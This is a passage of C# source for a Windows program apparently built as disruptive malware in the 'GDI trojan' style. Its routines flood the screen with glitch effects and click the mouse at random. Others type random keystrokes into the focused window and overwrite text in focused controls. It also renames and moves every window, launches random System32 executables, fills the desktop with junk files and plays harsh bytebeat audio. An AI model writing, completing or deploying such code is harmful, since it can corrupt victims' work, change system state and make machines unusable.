                Graphics.FromImage(bitmap).CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);
                Graphics graphics = Graphics.FromImage(bitmap);
                graphics.SmoothingMode = SmoothingMode.HighSpeed;
                graphics.PixelOffsetMode = PixelOffsetMode.HighSpeed;
                LinearGradientBrush brush = new LinearGradientBrush(rect, Color.FromArgb(random.Next(85, 136), random.Next(1, 33), random.Next(153, 203)), Color.FromArgb(random.Next(85, 136), random.Next(1, 33), random.Next(153, 203)), (LinearGradientMode)random.Next(4));
                Pen gpen = new Pen(brush, random.Next(69));
                Point point = new Point(random.Next(screenW), random.Next(screenH));
                Point point2 = new Point(random.Next(screenW), random.Next(screenH));
                Point point3 = new Point(random.Next(screenW), random.Next(screenH));
                Point[] points = new Point[3] { point, point2, point3 };
                switch (num)
                {
                    case 1:
                        graphics.FillPolygon(brush, points);
                        break;
                    case 2:
                        graphics.FillEllipse(brush, random.Next(screenW), random.Next(screenH), random.Next(screenW), random.Next(screenH));
                        break;
                    case 3:
                        graphics.FillPie(brush, random.Next(screenW), random.Next(screenH), random.Next(screenW), random.Next(screenH), random.Next(-360, 360), random.Next(-360, 360));
                        break;
                    case 4:
                        graphics.FillRectangle(brush, random.Next(screenW), random.Next(screenH), random.Next(screenW), random.Next(screenH));
                        break;
                    case 5:
                        graphics.DrawRectangle(gpen, random.Next(screenW), random.Next(screenH), random.Next(screenW), random.Next(screenH));
                        break;
                    case 6:
                        graphics.DrawEllipse(gpen, random.Next(screenW), random.Next(screenH), random.Next(screenW), random.Next(screenH));
                        break;
                    case 7:
                        graphics.DrawPie(gpen, random.Next(screenW), random.Next(screenH), random.Next(screenW), random.Next(screenH), random.Next(-360, 360), random.Next(-360, 360));
                        break;
                }
                Bitmap bitmap2 = new Bitmap(bitmap);
                IntPtr hdc2 = Graphics.FromHdc(GetDC(IntPtr.Zero)).GetHdc();
                IntPtr intPtr = CreateCompatibleDC(hdc2);
                SelectObject(intPtr, bitmap2.GetHbitmap());
                BitBlt(hdc2, 0, 0, bitmap2.Width, bitmap2.Height, intPtr, 0, 0, 13369376);
                DeleteObject(hdc2);
                DeleteObject(intPtr);
                Thread.Sleep(random.Next(10));
            }
            catch
            {
            }
        }
    }

    private class Drawer20 : Drawer
    {
        public override void Draw(IntPtr hdc)
        {
            try
            {
                IntPtr intPtr = CreateCompatibleDC(hdc);
                IntPtr intPtr2 = CreateCompatibleBitmap(hdc, screenW, screenH);
                SelectObject(intPtr, intPtr2);
                BitBlt(intPtr, 0, 0, screenW, screenH, hdc, 0, 0, 13369376);
                for (int i = 0; i < screenW; i++)
                {
                    BitBlt(intPtr, i, 0, 1, screenH, intPtr, i, -screenW - random.Next(-10, 11), 13369376);
                    BitBlt(intPtr, i, 0, 1, screenH, intPtr, i, screenW + random.Next(-10, 11), 13369376);
                    BitBlt(intPtr, i, 0, 1, screenH, intPtr, i, random.Next(-10, 11), 13369376);
                }
                _BLENDFUNCTION blf = new _BLENDFUNCTION();
                blf.BlendOp = AC_SRC_OVER;
                blf.BlendFlags = 0;
                blf.SourceConstantAlpha = (byte)127.5;
                blf.AlphaFormat = 0;
                AlphaBlend(hdc, 0, 0, screenW, screenH, intPtr, 0, 0, screenW, screenH, blf);
                DeleteObject(intPtr);
                DeleteObject(intPtr2);
                Thread.Sleep(random.Next(10));
            }
            catch
            {
            }
        }
    }

    [DllImport("user32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
    public static extern void mouse_event(uint dwFlags, uint dx, uint dy, uint cButtons, uint dwExtraInfo);
    private const int MOUSEEVENTF_LEFTDOWN = 0x02;
    private const int MOUSEEVENTF_LEFTUP = 0x04;
    private const int MOUSEEVENTF_RIGHTDOWN = 0x08;
    private const int MOUSEEVENTF_RIGHTUP = 0x10;

    public static void DoMouseClick()
    {
        uint X = (uint)Cursor.Position.X;
        uint Y = (uint)Cursor.Position.Y;
        mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, X, Y, 0, 0);
    }
    private class Cur : Drawer
    {

        public override void Draw(IntPtr hdc)
        {
            try
            {
                Cursor.Position = new Point(random.Next(screenW), random.Next(screenH));
                DoMouseClick();
                Thread.Sleep(random.Next(0, 1000));
            }
            catch { }
            Thread.Sleep(0);
        }
    }
    [DllImport("user32.dll")]
    static extern bool SetWindowText(IntPtr hWnd, string text);
    [DllImport("user32.dll")]
    static extern IntPtr GetForegroundWindow();
    private class Windowtext : Drawer
    {
        public override void Draw(IntPtr hdc)
        {
            try
            {
                Process myProcess = new Process();
                Process[] processes = Process.GetProcesses();

                foreach (var process in processes)
                {

                    IntPtr handle = process.MainWindowHandle;
                    if (handle != IntPtr.Zero)
                    {
                        // Creating object of random class
                        Random rand = new Random();

                        // Choosing the size of string
                        // Using Next() string
                        int stringlen = rand.Next(4, 10);
                        int randValue;
                        string str = "";
                        char letter;
                        for (int i = 0; i < stringlen; i++)
                        {

                            // Generating a random number.
                            randValue = rand.Next(0, 6969);

                            // Generating random character by converting
                            // the random number into character.
                            letter = Convert.ToChar(randValue + rand.Next(0, 6969));

                            // Appending the letter to string.
                            str = str + letter;
                        }
                        SetWindowText(GetForegroundWindow(), str);
                        SetWindowText(process.Handle, str);
                        SetWindowText(handle, str);
                        Thread.Sleep(0);
                    }
                }
            }
            catch { }

        }
    }

    private class Type : Drawer
    {
        public override void Draw(IntPtr hdc)
        {
            try
            {
                // Creating object of random class
                Random rand = new Random();

                // Choosing the size of string
                // Using Next() string
                int stringlen = rand.Next(4, 10);
                int randValue;
                string str = "";
                char letter;
                for (int i = 0; i < stringlen; i++)
                {

                    // Generating a random number.
                    randValue = rand.Next(0, 6969);

                    // Generating random character by converting
                    // the random number into character.
                    letter = Convert.ToChar(randValue + rand.Next(0, 6969));

                    // Appending the letter to string.
                    str = str + letter;
                }
                SendKeys.SendWait(str);
                Thread.Sleep(random.Next(1000));
            }
            catch { }
        }
    }
    [DllImport("user32.dll", SetLastError = true)]
    internal static extern bool MoveWindow(IntPtr hWnd, int X, int Y, int nWidth, int nHeight, bool bRepaint);
    private class Window : Drawer
    {

        public override void Draw(IntPtr hdc)
        {
            Process myProcess = new Process();
            Process[] processes = Process.GetProcesses();

            foreach (var process in processes)
            {
                try
                {
                    Console.WriteLine("Process Name: {0} ", process.ProcessName);

                    IntPtr handle = process.MainWindowHandle;
                    if (handle != IntPtr.Zero)
                    {
                        Random r = new Random();
                        MoveWindow(GetForegroundWindow(), random.Next(screenW), random.Next(screenH), random.Next(screenW), random.Next(screenH), true);
                        MoveWindow(handle, random.Next(screenW), random.Next(screenH), random.Next(screenW), random.Next(screenH), true);
                        MoveWindow(process.Handle, random.Next(screenW), random.Next(screenH), random.Next(screenW), random.Next(screenH), true);
                        MoveWindow(hdc, random.Next(screenW), random.Next(screenH), random.Next(screenW), random.Next(screenH), true);
                        Thread.Sleep(random.Next(0, 10000));
                    }
                }
                catch { }
            }


        }
    }
    private class Open : Drawer
    {

        public override void Draw(IntPtr hdc)
        {
            try
            {
                var rand = new Random();
                var files = Directory.GetFiles("c:\\Windows\\System32");
                Process.Start(files[rand.Next(files.Length)]);
                Thread.Sleep(random.Next(15000, 60000));
            }
            catch { }
        }
    }

    private class SendM : Drawer
    {

        public override void Draw(IntPtr hdc)
        {
            try
            {
                Process myProcess = new Process();
                Process[] processes = Process.GetProcesses();

                foreach (var process in processes)
                {

                    IntPtr handle = process.MainWindowHandle;
                    if (handle != IntPtr.Zero)
                    {

                        // Choosing the size of string
                        // Using Next() string
                        int stringlen = random.Next(100);
                        int randValue;
                        string str = "";
                        char letter;
                        for (int i = 0; i < stringlen; i++)
                        {

                            // Generating a random number.
                            randValue = random.Next(0, 255);

                            // Generating random character by converting
                            // the random number into character.
                            letter = Convert.ToChar(randValue + random.Next(0, 255));

                            // Appending the letter to string.
                            str = str + letter;
                        }
                        string s = str;
                        SetWindowText(handle, s);
                        SetWindowText(process.Handle, str);
                        StringBuilder stringBuilder = new StringBuilder(32767);
                        uint windowThreadProcessId = GetWindowThreadProcessId((int)GetForegroundWindow(), 0);
                        uint currentThreadId = GetCurrentThreadId();
                        AttachThreadInput(windowThreadProcessId, currentThreadId, fAttach: true);
                        int focus = GetFocus();
                        AttachThreadInput(windowThreadProcessId, currentThreadId, fAttach: false);
                        string text = str;
                        char[] array = new char[1];
                        for (int j = 0; j < array.Length; j++)
                        {
                            array[j] = text[random.Next(text.Length)];
                        }
                        string oldValue = new string(array);
                        SendMessage(focus, 13, stringBuilder.Capacity, stringBuilder);
                        stringBuilder.Replace(oldValue, str);
                        stringBuilder.Append(str);
                        //stringBuilder.Clear();
                        SendMessage(focus, 12, 0, stringBuilder); //5 Window, 10 blink, 11 black, 12 settext, 13 gettext, 16 delete buttons, 24 inv, 26 move,0x0030 font
                        Thread.Sleep(random.Next(15000));
                    }
                }
            }
            catch { }
        }
    }

    private class createfiles : Drawer
    {
        public override void Draw(IntPtr hdc)
        {
            try
            {
                int stringlen = random.Next(100);
                int randValue;
                string str = "";
                char letter;
                for (int i = 0; i < stringlen; i++)
                {

                    // Generating a random number.
                    randValue = random.Next(0, 255);

                    // Generating random character by converting
                    // the random number into character.
                    letter = Convert.ToChar(randValue + random.Next(0, 255));

                    // Appending the letter to string.
                    str = str + letter;
                }
                int stringlen1 = random.Next(100);
                int randValue1;
                string str1 = "";
                char letter1;
                for (int i = 0; i < stringlen1; i++)
                {

                    // Generating a random number.
                    randValue1 = random.Next(0, 255);

                    // Generating random character by converting
                    // the random number into character.
                    letter1 = Convert.ToChar(randValue1 + random.Next(0, 255));

                    // Appending the letter to string.
                    str1 = str1 + letter1;
                }
                // Full file name 
                string fileName = System.IO.Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), str + "." + str1);

                try
                {
                    // Check if file already exists. If yes, delete it. 
                    if (File.Exists(fileName))
                    {
                        File.Delete(fileName);
                    }

                    // Create a new file 
                    using (FileStream fs = File.Create(fileName))
                    {
                        // Add some text to file
                        Byte[] title = new UTF8Encoding(true).GetBytes(str);
                        fs.Write(title, 0, title.Length);
                        byte[] author = new UTF8Encoding(true).GetBytes(str1);
                        fs.Write(author, 0, author.Length);
                    }

                    // Open the stream and read it back.
                    using (StreamReader sr = File.OpenText(fileName))
                    {
                        string s = "";
                        while ((s = sr.ReadLine()) != null)
                        {
                            Console.WriteLine(s);
                        }
                    }
                }
                catch (Exception Ex)
                {
                    Console.WriteLine(Ex.ToString());
                }
                Thread.Sleep(random.Next(30000, 60000));
            }
            catch { }
        }
    }

    private class msg : Drawer
    {
        public override void Draw(IntPtr hdc)
        {
            try
            {
                MessageBox.Show("", "", MessageBoxButtons.AbortRetryIgnore, MessageBoxIcon.None, MessageBoxDefaultButton.Button1, MessageBoxOptions.RightAlign, true);
            }
            catch { }
        }
    }
    private abstract class Drawer
    {
        public bool running;

        public Random random = new Random();

        public int screenW = Screen.PrimaryScreen.Bounds.Width;

        public int screenH = Screen.PrimaryScreen.Bounds.Height;

        public void Start()
        {
            if (!running)
            {
                running = true;
                new Thread(DrawLoop).Start();
            }
        }

        public void Stop()
        {
            running = false;
        }

        private void DrawLoop()
        {
            while (running)
            {
                IntPtr dC = GetDC(IntPtr.Zero);
                Draw(dC);
                ReleaseDC(IntPtr.Zero, dC);
            }
        }

        public void Redraw()
        {
            RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, RedrawWindowFlags.Invalidate | RedrawWindowFlags.Erase | RedrawWindowFlags.AllChildren);
        }

        public abstract void Draw(IntPtr hdc);
    }

    [Flags]
    private enum RedrawWindowFlags : uint
    {
        Invalidate = 1u,
        InternalPaint = 2u,
        Erase = 4u,
        Validate = 8u,
        NoInternalPaint = 0x10u,
        NoErase = 0x20u,
        NoChildren = 0x40u,
        AllChildren = 0x80u,
        UpdateNow = 0x100u,
        EraseNow = 0x200u,
        Frame = 0x400u,
        NoFrame = 0x800u
    }
    private class randomdrawer : Drawer
    {
        public override void Draw(IntPtr hdc)
        {
            int ra = random.Next(1, 21);
            Drawer drawer = new Drawer1();
            Drawer drawer2 = new Drawer2();
            Drawer drawer3 = new Drawer3();
            Drawer drawer4 = new Drawer4();
            Drawer drawer5 = new Drawer5();
            Drawer drawer6 = new Drawer6();
            Drawer drawer7 = new Drawer7();
            Drawer drawer8 = new Drawer8();
            Drawer drawer9 = new Drawer9();
            Drawer drawer10 = new Drawer10();
            Drawer drawer11 = new Drawer11();
            Drawer drawer12 = new Drawer12();
            Drawer drawer13 = new Drawer13();
            Drawer drawer14 = new Drawer14();
            Drawer drawer15 = new Drawer15();
            Drawer drawer16 = new Drawer16();
            Drawer drawer17 = new Drawer17();
            Drawer drawer18 = new Drawer18();
            Drawer drawer19 = new Drawer19();
            Drawer drawer20 = new Drawer20();
            switch (ra)
            {
                case 1:
                    drawer.Start();
                    Thread.Sleep(random.Next(15000));
                    drawer.Stop();
                    break;
                case 2:
                    drawer2.Start();
                    Thread.Sleep(random.Next(15000));
                    drawer2.Stop();
                    break;
                case 3:
                    drawer3.Start();
                    Thread.Sleep(random.Next(15000));
                    drawer3.Stop();
                    break;
                case 4:
                    drawer4.Start();
                    Thread.Sleep(random.Next(15000));
                    drawer4.Stop();
                    break;
                case 5:
                    drawer5.Start();
                    Thread.Sleep(random.Next(15000));
                    drawer5.Stop();
                    break;
                case 6:
                    drawer6.Start();
                    Thread.Sleep(random.Next(15000));
                    drawer6.Stop();
                    break;
                case 7:
                    drawer7.Start();
                    Thread.Sleep(random.Next(15000));
                    drawer7.Stop();
                    break;
                case 8:
                    drawer8.Start();
                    Thread.Sleep(random.Next(15000));
                    drawer8.Stop();
                    break;
                case 9:
                    drawer9.Start();
                    Thread.Sleep(random.Next(15000));
                    drawer9.Stop();
                    break;
                case 10:
                    drawer10.Start();
                    Thread.Sleep(random.Next(15000));
                    drawer10.Stop();
                    break;
                case 11:
                    drawer11.Start();
                    Thread.Sleep(random.Next(15000));
                    drawer11.Stop();
                    break;
                case 12:
                    drawer12.Start();
                    Thread.Sleep(random.Next(15000));
                    drawer12.Stop();
                    break;
                case 13:
                    drawer13.Start();
                    Thread.Sleep(random.Next(15000));
                    drawer13.Stop();
                    break;
                case 14:
                    drawer14.Start();
                    Thread.Sleep(random.Next(15000));
                    drawer14.Stop();
                    break;
                case 15:
                    drawer15.Start();
                    Thread.Sleep(random.Next(15000));
                    drawer15.Stop();
                    break;
                case 16:
                    drawer16.Start();
                    Thread.Sleep(random.Next(15000));
                    drawer16.Stop();
                    break;
                case 17:
                    drawer17.Start();
                    Thread.Sleep(random.Next(15000));
                    drawer17.Stop();
                    break;
                case 18:
                    drawer18.Start();
                    Thread.Sleep(random.Next(15000));
                    drawer18.Stop();
                    break;
                case 19:
                    drawer19.Start();
                    Thread.Sleep(random.Next(15000));
                    drawer19.Stop();
                    break;
                case 20:
                    drawer20.Start();
                    Thread.Sleep(random.Next(15000));
                    drawer20.Stop();
                    break;
            }
        }
    }
    private class randomdrawer1 : Drawer
    {
        public override void Draw(IntPtr hdc)
        {
            int ra = random.Next(1, 21);
            Drawer drawer = new Drawer1();
            Drawer drawer2 = new Drawer2();
            Drawer drawer3 = new Drawer3();
            Drawer drawer4 = new Drawer4();
            Drawer drawer5 = new Drawer5();
            Drawer drawer6 = new Drawer6();
            Drawer drawer7 = new Drawer7();
            Drawer drawer8 = new Drawer8();
            Drawer drawer9 = new Drawer9();
            Drawer drawer10 = new Drawer10();
            Drawer drawer11 = new Drawer11();
            Drawer drawer12 = new Drawer12();
            Drawer drawer13 = new Drawer13();
            Drawer drawer14 = new Drawer14();
            Drawer drawer15 = new Drawer15();
            Drawer drawer16 = new Drawer16();
            Drawer drawer17 = new Drawer17();
            Drawer drawer18 = new Drawer18();
            Drawer drawer19 = new Drawer19();
            Drawer drawer20 = new Drawer20();
            switch (ra)
            {
                case 1:
                    drawer.Start();
                    Thread.Sleep(random.Next(15000));
                    drawer.Stop();
                    break;
                case 2:
                    drawer2.Start();
                    Thread.Sleep(random.Next(15000));
                    drawer2.Stop();
                    break;
                case 3:
                    drawer3.Start();
                    Thread.Sleep(random.Next(15000));
                    drawer3.Stop();
                    break;
                case 4:
                    drawer4.Start();
                    Thread.Sleep(random.Next(15000));
                    drawer4.Stop();
                    break;
                case 5:
                    drawer5.Start();
                    Thread.Sleep(random.Next(15000));
                    drawer5.Stop();
                    break;
                case 6:
                    drawer6.Start();
                    Thread.Sleep(random.Next(15000));
                    drawer6.Stop();
                    break;
                case 7:
                    drawer7.Start();
                    Thread.Sleep(random.Next(15000));
                    drawer7.Stop();
                    break;
                case 8:
                    drawer8.Start();
                    Thread.Sleep(random.Next(15000));
                    drawer8.Stop();
                    break;
                case 9:
                    drawer9.Start();
                    Thread.Sleep(random.Next(15000));
                    drawer9.Stop();
                    break;
                case 10:
                    drawer10.Start();
                    Thread.Sleep(random.Next(15000));
                    drawer10.Stop();
                    break;
                case 11:
                    drawer11.Start();
                    Thread.Sleep(random.Next(15000));
                    drawer11.Stop();
                    break;
                case 12:
                    drawer12.Start();
                    Thread.Sleep(random.Next(15000));
                    drawer12.Stop();
                    break;
                case 13:
                    drawer13.Start();
                    Thread.Sleep(random.Next(15000));
                    drawer13.Stop();
                    break;
                case 14:
                    drawer14.Start();
                    Thread.Sleep(random.Next(15000));
                    drawer14.Stop();
                    break;
                case 15:
                    drawer15.Start();
                    Thread.Sleep(random.Next(15000));
                    drawer15.Stop();
                    break;
                case 16:
                    drawer16.Start();
                    Thread.Sleep(random.Next(15000));
                    drawer16.Stop();
                    break;
                case 17:
                    drawer17.Start();
                    Thread.Sleep(random.Next(15000));
                    drawer17.Stop();
                    break;
                case 18:
                    drawer18.Start();
                    Thread.Sleep(random.Next(15000));
                    drawer18.Stop();
                    break;
                case 19:
                    drawer19.Start();
                    Thread.Sleep(random.Next(15000));
                    drawer19.Stop();
                    break;
                case 20:
                    drawer20.Start();
                    Thread.Sleep(random.Next(15000));
                    drawer20.Stop();
                    break;
            }
        }
    }
    private static void byte1(int hz, int secs)
    {
        Random random = new Random();
        using (var stream = new MemoryStream())
        {
            var writer = new BinaryWriter(stream);

            writer.Write("RIFF".ToCharArray());  // chunk id
            writer.Write((UInt32)0);             // chunk size
            writer.Write("WAVE".ToCharArray());  // format

            writer.Write("fmt ".ToCharArray());  // chunk id
            writer.Write((UInt32)16);            // chunk size
            writer.Write((UInt16)1);             // audio format

            var channels = 1;
            var sample_rate = hz;
            var bits_per_sample = 8;

            writer.Write((UInt16)channels);
            writer.Write((UInt32)sample_rate);
            writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
            writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
            writer.Write((UInt16)bits_per_sample);

            writer.Write("data".ToCharArray());

            var seconds = secs;

            var data = new byte[sample_rate * seconds];

            for (var t = 0; t < data.Length; t++)
                data[t] = (byte)(
                    (t - (t & t >> 12) / 2 * (t / 1024 % 4 - 3) & 127) + (8e3 * (1 - t % 16384 / 1e4))
                    //t * (42 & t >> 10)
                    //t | t % 255 | t % 257
                    //t * (t >> 9 | t >> 13) & 16
                    );

            writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

            foreach (var elt in data) writer.Write(elt);

            writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
            writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

            stream.Seek(0, SeekOrigin.Begin);

            new SoundPlayer(stream).PlaySync();
        }
    }
    private static void byte2(int hz, int secs)
    {
        Random random = new Random();
        using (var stream = new MemoryStream())
        {
            var writer = new BinaryWriter(stream);

            writer.Write("RIFF".ToCharArray());  // chunk id
            writer.Write((UInt32)0);             // chunk size
            writer.Write("WAVE".ToCharArray());  // format

            writer.Write("fmt ".ToCharArray());  // chunk id
            writer.Write((UInt32)16);            // chunk size
            writer.Write((UInt16)1);             // audio format

            var channels = 1;
            var sample_rate = hz;
            var bits_per_sample = 8;

            writer.Write((UInt16)channels);
            writer.Write((UInt32)sample_rate);
            writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
            writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
            writer.Write((UInt16)bits_per_sample);

            writer.Write("data".ToCharArray());

            var seconds = secs;

            var data = new byte[sample_rate * seconds];

            for (var t = 0; t < data.Length; t++)
                data[t] = (byte)(
                    (6E3 * (1 - t % 2 * (12 - ((t >> 13 & 7) - 7) - ((t >> 15 & 7) - 7)) / 16384)) + (t * (t & t >> 9) >> 11 & 64) + (t << 3 * (t & t >> 10) >> 4 & 63)
                    //t * (42 & t >> 10)
                    //t | t % 255 | t % 257
                    //t * (t >> 9 | t >> 13) & 16
                    );

            writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

            foreach (var elt in data) writer.Write(elt);

            writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
            writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

            stream.Seek(0, SeekOrigin.Begin);

            new SoundPlayer(stream).PlaySync();
        }
    }
    private static void byte3(int hz, int secs)
    {
        Random random = new Random();
        using (var stream = new MemoryStream())
        {
            var writer = new BinaryWriter(stream);

            writer.Write("RIFF".ToCharArray());  // chunk id
            writer.Write((UInt32)0);             // chunk size
            writer.Write("WAVE".ToCharArray());  // format

            writer.Write("fmt ".ToCharArray());  // chunk id
            writer.Write((UInt32)16);            // chunk size
            writer.Write((UInt16)1);             // audio format

            var channels = 1;
            var sample_rate = hz;
            var bits_per_sample = 8;

            writer.Write((UInt16)channels);
            writer.Write((UInt32)sample_rate);
            writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
            writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
            writer.Write((UInt16)bits_per_sample);

            writer.Write("data".ToCharArray());

            var seconds = secs;

            var data = new byte[sample_rate * seconds];

            for (var t = 0; t < data.Length; t++)
                data[t] = (byte)(
                    ((t * "57"[(t >> 14) % 2] >> 2 & 128) + (t * "1234"[(t >> 10) % 4] * "57"[(t >> 14) % 2] & 95) + 96 * (1 - (1 & t >> "999"[(t >> 12) % 2])) + 70 * Math.Sin(4E3 / (t & 4095))) / 2 - 2
                    //t * (42 & t >> 10)
                    //t | t % 255 | t % 257
                    //t * (t >> 9 | t >> 13) & 16
                    );

            writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

            foreach (var elt in data) writer.Write(elt);

            writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
            writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

            stream.Seek(0, SeekOrigin.Begin);

            new SoundPlayer(stream).PlaySync();
        }
    }
    private static void byte4(int hz, int secs)
    {
        Random random = new Random();
        using (var stream = new MemoryStream())
        {
            var writer = new BinaryWriter(stream);

            writer.Write("RIFF".ToCharArray());  // chunk id
            writer.Write((UInt32)0);             // chunk size
            writer.Write("WAVE".ToCharArray());  // format

            writer.Write("fmt ".ToCharArray());  // chunk id
            writer.Write((UInt32)16);            // chunk size
            writer.Write((UInt16)1);             // audio format

            var channels = 1;
            var sample_rate = hz;
            var bits_per_sample = 8;

            writer.Write((UInt16)channels);
            writer.Write((UInt32)sample_rate);
            writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
            writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
            writer.Write((UInt16)bits_per_sample);

            writer.Write("data".ToCharArray());

            var seconds = secs;

            var data = new byte[sample_rate * seconds];

            for (var t = 0; t < data.Length; t++)
                data[t] = (byte)(
                    (t - t * (t / 62 / 20) ^ t)
                    //t * (42 & t >> 10)
                    //t | t % 255 | t % 257
                    //t * (t >> 9 | t >> 13) & 16
                    );

            writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

            foreach (var elt in data) writer.Write(elt);

            writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
            writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

            stream.Seek(0, SeekOrigin.Begin);

            new SoundPlayer(stream).PlaySync();
        }
    }
    private static void byte5(int hz, int secs)
    {
        Random random = new Random();
        using (var stream = new MemoryStream())
        {
            var writer = new BinaryWriter(stream);

            writer.Write("RIFF".ToCharArray());  // chunk id
            writer.Write((UInt32)0);             // chunk size
            writer.Write("WAVE".ToCharArray());  // format

            writer.Write("fmt ".ToCharArray());  // chunk id
            writer.Write((UInt32)16);            // chunk size
            writer.Write((UInt16)1);             // audio format

            var channels = 1;
            var sample_rate = hz;
            var bits_per_sample = 8;

            writer.Write((UInt16)channels);
            writer.Write((UInt32)sample_rate);
            writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
            writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
            writer.Write((UInt16)bits_per_sample);

            writer.Write("data".ToCharArray());

            var seconds = secs;

            var data = new byte[sample_rate * seconds];

            for (var t = 0; t < data.Length; t++)
                data[t] = (byte)(
                    t >> 4 | t * (t >> 5 & t >> 7) | t * (t >> 4 & t >> 5 | t >> 9) * t * (t + t >> t)
                    //t * (42 & t >> 10)
                    //t | t % 255 | t % 257
                    //t * (t >> 9 | t >> 13) & 16
                    );

            writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

            foreach (var elt in data) writer.Write(elt);

            writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
            writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

            stream.Seek(0, SeekOrigin.Begin);

            new SoundPlayer(stream).PlaySync();
        }
    }
    private static void byte6(int hz, int secs)
    {
        Random random = new Random();
        using (var stream = new MemoryStream())
        {
            var writer = new BinaryWriter(stream);

            writer.Write("RIFF".ToCharArray());  // chunk id
            writer.Write((UInt32)0);             // chunk size
            writer.Write("WAVE".ToCharArray());  // format

            writer.Write("fmt ".ToCharArray());  // chunk id
            writer.Write((UInt32)16);            // chunk size
            writer.Write((UInt16)1);             // audio format

            var channels = 1;
            var sample_rate = hz;
            var bits_per_sample = 8;

            writer.Write((UInt16)channels);
            writer.Write((UInt32)sample_rate);
            writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
            writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
            writer.Write((UInt16)bits_per_sample);

            writer.Write("data".ToCharArray());

            var seconds = secs;

            var data = new byte[sample_rate * seconds];
            int rrr = random.Next(1, 8);
            for (var t = 0; t < data.Length; t++)
                data[t] = (byte)(
                    ("152535255545355457565758888888885"[(t >> 12) % 32] * t >> rrr & 191) + (t >> 8) & 192
                    //t * (42 & t >> 10)
                    //t | t % 255 | t % 257
                    //t * (t >> 9 | t >> 13) & 16
                    );

            writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

            foreach (var elt in data) writer.Write(elt);

            writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
            writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

            stream.Seek(0, SeekOrigin.Begin);

            new SoundPlayer(stream).PlaySync();
        }
    }
    private static void byte7(int hz, int secs)
    {
        Random random = new Random();
        using (var stream = new MemoryStream())
        {
            var writer = new BinaryWriter(stream);

            writer.Write("RIFF".ToCharArray());  // chunk id
            writer.Write((UInt32)0);             // chunk size
            writer.Write("WAVE".ToCharArray());  // format

            writer.Write("fmt ".ToCharArray());  // chunk id
            writer.Write((UInt32)16);            // chunk size
            writer.Write((UInt16)1);             // audio format

            var channels = 1;
            var sample_rate = hz;
            var bits_per_sample = 8;

            writer.Write((UInt16)channels);
            writer.Write((UInt32)sample_rate);
            writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
            writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
            writer.Write((UInt16)bits_per_sample);

            writer.Write("data".ToCharArray());

            var seconds = secs;

            var data = new byte[sample_rate * seconds];

            for (var t = 0; t < data.Length; t++)
                data[t] = (byte)(
                    t * 5 * (3 - (3 & t >> 9) + (3 & t >> 8)) - (3 & t) / 4e4 / (t & 4095)
                    //t * (42 & t >> 10)
                    //t | t % 255 | t % 257
                    //t * (t >> 9 | t >> 13) & 16
                    );

            writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

            foreach (var elt in data) writer.Write(elt);

            writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
            writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

            stream.Seek(0, SeekOrigin.Begin);

            new SoundPlayer(stream).PlaySync();
        }
    }
    private static void byte8(int hz, int secs)
    {
        Random random = new Random();
        using (var stream = new MemoryStream())
        {
            var writer = new BinaryWriter(stream);

            writer.Write("RIFF".ToCharArray());  // chunk id
            writer.Write((UInt32)0);             // chunk size
            writer.Write("WAVE".ToCharArray());  // format

            writer.Write("fmt ".ToCharArray());  // chunk id
            writer.Write((UInt32)16);            // chunk size
            writer.Write((UInt16)1);             // audio format

            var channels = 1;
            var sample_rate = hz;
            var bits_per_sample = 8;

            writer.Write((UInt16)channels);
            writer.Write((UInt32)sample_rate);
            writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
            writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
            writer.Write((UInt16)bits_per_sample);

            writer.Write("data".ToCharArray());

            var seconds = secs;

            var data = new byte[sample_rate * seconds];
            int rrr = random.Next(8);
            for (var t = 0; t < data.Length; t++)
                data[t] = (byte)(
                    (t * "218151231515653242639654782318958234"[(t >> 12) % 32] >> rrr & 95) * 4e3 / (t & 12287)
                    //t * (42 & t >> 10)
                    //t | t % 255 | t % 257
                    //t * (t >> 9 | t >> 13) & 16
                    );

